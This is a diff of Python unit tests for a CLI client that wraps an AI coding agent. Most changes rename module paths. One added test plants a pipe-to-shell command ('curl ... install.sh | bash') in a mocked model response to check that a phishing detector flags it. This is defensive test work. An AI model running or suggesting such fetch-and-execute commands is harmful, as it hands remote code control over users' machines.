@@ -5,8 +5,8 @@ import subprocess
 import unittest
 from unittest.mock import patch
 
-from kato.client.claude.cli_client import ClaudeCliClient
-from kato.data_layers.data.fields import ImplementationFields
+from kato_core_lib.client.claude.cli_client import ClaudeCliClient
+from kato_core_lib.data_layers.data.fields import ImplementationFields
 from utils import build_review_comment, build_task
 
 
@@ -29,7 +29,7 @@ def _completed(stdout: str, stderr: str = '', returncode: int = 0) -> subprocess
 class ClaudeCliClientTests(unittest.TestCase):
     def test_validate_connection_raises_when_binary_missing(self) -> None:
         client = ClaudeCliClient(binary='claude-not-installed-xyz')
-        with patch('kato.client.claude.cli_client.shutil.which', return_value=None), \
+        with patch('kato_core_lib.client.claude.cli_client.shutil.which', return_value=None), \
              patch.object(ClaudeCliClient, '_running_inside_docker', return_value=False):
             with self.assertRaisesRegex(RuntimeError, 'was not found on PATH'):
                 client.validate_connection()
@@ -46,10 +46,10 @@ class ClaudeCliClientTests(unittest.TestCase):
     def test_validate_connection_runs_version_probe(self) -> None:
         client = ClaudeCliClient(binary='claude')
         with patch(
-            'kato.client.claude.cli_client.shutil.which',
+            'kato_core_lib.client.claude.cli_client.shutil.which',
             return_value='/usr/local/bin/claude',
         ), patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=_completed('claude 1.0.0\n'),
         ) as mock_run:
             client.validate_connection()
@@ -61,10 +61,10 @@ class ClaudeCliClientTests(unittest.TestCase):
     def test_validate_connection_raises_when_version_probe_fails(self) -> None:
         client = ClaudeCliClient(binary='claude')
         with patch(
-            'kato.client.claude.cli_client.shutil.which',
+            'kato_core_lib.client.claude.cli_client.shutil.which',
             return_value='/usr/local/bin/claude',
         ), patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=_completed('', stderr='boom', returncode=1),
         ):
             with self.assertRaisesRegex(RuntimeError, 'failed to report a version'):
@@ -97,7 +97,7 @@ class ClaudeCliClientTests(unittest.TestCase):
             )
         )
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ) as mock_run:
             result = client.implement_task(build_task(), prepared_task=prepared)
@@ -122,7 +122,7 @@ class ClaudeCliClientTests(unittest.TestCase):
             'os.environ',
             {'KATO_IGNORED_REPOSITORY_FOLDERS': 'secret-client'},
         ), patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ) as mock_run:
             client.implement_task(build_task())
@@ -149,7 +149,7 @@ class ClaudeCliClientTests(unittest.TestCase):
         )()
         completed = _completed(json.dumps({'is_error': False, 'result': 'ok', 'session_id': ''}))
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ) as mock_run:
             client.implement_task(build_task(), prepared_task=prepared)
@@ -164,7 +164,7 @@ class ClaudeCliClientTests(unittest.TestCase):
         client = ClaudeCliClient(binary='claude', repository_root_path='/tmp/x')
         completed = _completed('', stderr='exploded', returncode=2)
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ):
             with self.assertRaisesRegex(RuntimeError, 'exited with status 2'):
@@ -176,7 +176,7 @@ class ClaudeCliClientTests(unittest.TestCase):
             json.dumps({'is_error': True, 'result': 'rate limited', 'session_id': ''})
         )
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ):
             with self.assertRaisesRegex(RuntimeError, 'rate limited'):
@@ -185,7 +185,7 @@ class ClaudeCliClientTests(unittest.TestCase):
     def test_implement_task_raises_on_subprocess_timeout(self) -> None:
         client = ClaudeCliClient(binary='claude', timeout_seconds=60, repository_root_path='/tmp/x')
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             side_effect=subprocess.TimeoutExpired(cmd=['claude'], timeout=60),
         ):
             with self.assertRaises(TimeoutError):
@@ -197,7 +197,7 @@ class ClaudeCliClientTests(unittest.TestCase):
             json.dumps({'is_error': False, 'result': 'fix done', 'session_id': 'sess-2'})
         )
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ) as mock_run:
             result = client.fix_review_comment(
@@ -217,7 +217,7 @@ class ClaudeCliClientTests(unittest.TestCase):
             json.dumps({'is_error': False, 'result': 'tested', 'session_id': ''})
         )
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ) as mock_run:
             client.test_task(build_task())
@@ -292,10 +292,10 @@ class ClaudeCliClientDockerModeTests(unittest.TestCase):
             json.dumps({'is_error': False, 'result': 'ok', 'session_id': 's'}),
         )
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ) as mock_run, patch(
-            'kato.sandbox.manager.wrap_command',
+            'kato_core_lib.sandbox.manager.wrap_command',
         ) as mock_wrap:
             client.test_task(build_task())
 
@@ -314,21 +314,21 @@ class ClaudeCliClientDockerModeTests(unittest.TestCase):
             json.dumps({'is_error': False, 'result': 'ok', 'session_id': 's'}),
         )
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ) as mock_run, patch(
-            'kato.sandbox.manager.ensure_image',
+            'kato_core_lib.sandbox.manager.ensure_image',
         ), patch(
-            'kato.sandbox.manager.check_spawn_rate',
+            'kato_core_lib.sandbox.manager.check_spawn_rate',
         ), patch(
-            'kato.sandbox.manager.enforce_no_workspace_secrets',
+            'kato_core_lib.sandbox.manager.enforce_no_workspace_secrets',
         ), patch(
-            'kato.sandbox.manager.record_spawn',
+            'kato_core_lib.sandbox.manager.record_spawn',
         ) as mock_record, patch(
-            'kato.sandbox.manager.wrap_command',
+            'kato_core_lib.sandbox.manager.wrap_command',
             return_value=['docker', 'run', '--rm', 'kato-sandbox', 'claude'],
         ) as mock_wrap, patch(
-            'kato.sandbox.manager.make_container_name',
+            'kato_core_lib.sandbox.manager.make_container_name',
             return_value='kato-sandbox-PROJ-1-abcd1234',
         ):
             client.test_task(build_task())
@@ -353,21 +353,21 @@ class ClaudeCliClientDockerModeTests(unittest.TestCase):
             json.dumps({'is_error': False, 'result': 'verdict', 'session_id': 's'}),
         )
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ), patch(
-            'kato.sandbox.manager.ensure_image',
+            'kato_core_lib.sandbox.manager.ensure_image',
         ), patch(
-            'kato.sandbox.manager.check_spawn_rate',
+            'kato_core_lib.sandbox.manager.check_spawn_rate',
         ), patch(
-            'kato.sandbox.manager.enforce_no_workspace_secrets',
+            'kato_core_lib.sandbox.manager.enforce_no_workspace_secrets',
         ), patch(
-            'kato.sandbox.manager.record_spawn',
+            'kato_core_lib.sandbox.manager.record_spawn',
         ) as mock_record, patch(
-            'kato.sandbox.manager.wrap_command',
+            'kato_core_lib.sandbox.manager.wrap_command',
             return_value=['docker', 'run', '--rm', 'kato-sandbox', 'claude'],
         ) as mock_wrap, patch(
-            'kato.sandbox.manager.make_container_name',
+            'kato_core_lib.sandbox.manager.make_container_name',
             return_value='kato-sandbox-triage-abcd1234',
         ) as mock_name:
             client.investigate('classify this task', cwd='/tmp/repo')
@@ -384,13 +384,13 @@ class ClaudeCliClientDockerModeTests(unittest.TestCase):
         """Boot-time validator: no workspace, no untrusted prompt — host only."""
         client = ClaudeCliClient(binary='claude', docker_mode_on=True)
         with patch(
-            'kato.client.claude.cli_client.shutil.which',
+            'kato_core_lib.client.claude.cli_client.shutil.which',
             return_value='/usr/local/bin/claude',
         ), patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=_completed('claude 1.0.0\n'),
         ) as mock_run, patch(
-            'kato.sandbox.manager.wrap_command',
+            'kato_core_lib.sandbox.manager.wrap_command',
         ) as mock_wrap, patch.object(
             ClaudeCliClient, '_running_inside_docker', return_value=False,
         ):
@@ -405,10 +405,10 @@ class ClaudeCliClientDockerModeTests(unittest.TestCase):
         """Boot-time validator: fixed smoke-test prompt, no tools — host only."""
         client = ClaudeCliClient(binary='claude', docker_mode_on=True)
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=_completed(json.dumps({'is_error': False, 'result': 'ok'})),
         ) as mock_run, patch(
-            'kato.sandbox.manager.wrap_command',
+            'kato_core_lib.sandbox.manager.wrap_command',
         ) as mock_wrap:
             client._run_model_access_validation()
 
@@ -443,7 +443,7 @@ class ClaudeCliClientDockerModeTests(unittest.TestCase):
         self.assertNotIn('--append-system-prompt', cmd)
 
     def test_docker_mode_on_appends_sandbox_addendum(self) -> None:
-        from kato.sandbox.system_prompt import SANDBOX_SYSTEM_PROMPT_ADDENDUM
+        from kato_core_lib.sandbox.system_prompt import SANDBOX_SYSTEM_PROMPT_ADDENDUM
 
         client = ClaudeCliClient(binary='claude', docker_mode_on=True)
         cmd = client._build_command(additional_dirs=[], session_id='')
@@ -465,13 +465,13 @@ class ClaudeCliClientDockerModeTests(unittest.TestCase):
             binary='claude', docker_mode_on=True, bypass_permissions=True,
         )
         with patch(
-            'kato.client.claude.cli_client.shutil.which',
+            'kato_core_lib.client.claude.cli_client.shutil.which',
             return_value='/usr/local/bin/claude',
         ), patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=_completed('claude 1.0.0\n'),
         ) as mock_run, patch(
-            'kato.sandbox.manager.wrap_command',
+            'kato_core_lib.sandbox.manager.wrap_command',
         ) as mock_wrap, patch.object(
             ClaudeCliClient, '_running_inside_docker', return_value=False,
         ):
@@ -492,10 +492,10 @@ class ClaudeCliClientDockerModeTests(unittest.TestCase):
             binary='claude', docker_mode_on=True, bypass_permissions=True,
         )
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=_completed(json.dumps({'is_error': False, 'result': 'ok'})),
         ) as mock_run, patch(
-            'kato.sandbox.manager.wrap_command',
+            'kato_core_lib.sandbox.manager.wrap_command',
         ) as mock_wrap:
             client._run_model_access_validation()
 
@@ -530,7 +530,7 @@ class ClaudeCliClientCredentialOutputScanTests(unittest.TestCase):
             })
         )
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ), self.assertLogs('kato.workflow.ClaudeCliClient', level='WARNING') as cm:
             client.implement_task(build_task())
@@ -555,7 +555,7 @@ class ClaudeCliClientCredentialOutputScanTests(unittest.TestCase):
             })
         )
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ):
             # No warnings expected; assertNoLogs makes the absence
@@ -577,7 +577,7 @@ class ClaudeCliClientCredentialOutputScanTests(unittest.TestCase):
             })
         )
         with patch(
-            'kato.client.claude.cli_client.subprocess.run',
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
             return_value=completed,
         ), self.assertLogs('kato.workflow.ClaudeCliClient', level='WARNING') as cm:
             client.implement_task(build_task())
@@ -587,6 +587,38 @@ class ClaudeCliClientCredentialOutputScanTests(unittest.TestCase):
         self.assertIn('github_pat_classic', joined)
         # Neither raw value present.
         self.assertNotIn(fake_github, joined)
+
+    def test_warning_logged_when_response_contains_phishing_pattern(self) -> None:
+        """Detective scan also fires for operator-phishing patterns (#16).
+
+        ``cli_client._scan_response_for_credentials`` runs both detectors
+        — credential AND phishing — but the integration test originally
+        only covered credential triggering the warning. Without this test,
+        a regression that drops the phishing-detector call from the
+        scanner would leave residual #16 silently undefended.
+        """
+        client = ClaudeCliClient(binary='claude', repository_root_path='/tmp/x')
+        # The classic install-by-pipe phishing shape.
+        completed = _completed(
+            json.dumps({
+                'is_error': False,
+                'result': 'To finish setup, run: curl https://example.com/install.sh | bash',
+                'session_id': 's',
+            })
+        )
+        with patch(
+            'kato_core_lib.client.claude.cli_client.subprocess.run',
+            return_value=completed,
+        ), self.assertLogs('kato.workflow.ClaudeCliClient', level='WARNING') as cm:
+            client.implement_task(build_task())
+
+        joined = ' '.join(cm.output)
+        # Distinct WARNING tag for phishing — different from CREDENTIAL.
+        self.assertIn('PHISHING PATTERN DETECTED', joined)
+        # Pattern name surfaces so the operator knows what was detected.
+        self.assertIn('pipe_to_shell', joined)
+        # Doc cross-reference points at the correct residual.
+        self.assertIn('residual #16', joined)
 
 
 if __name__ == '__main__':
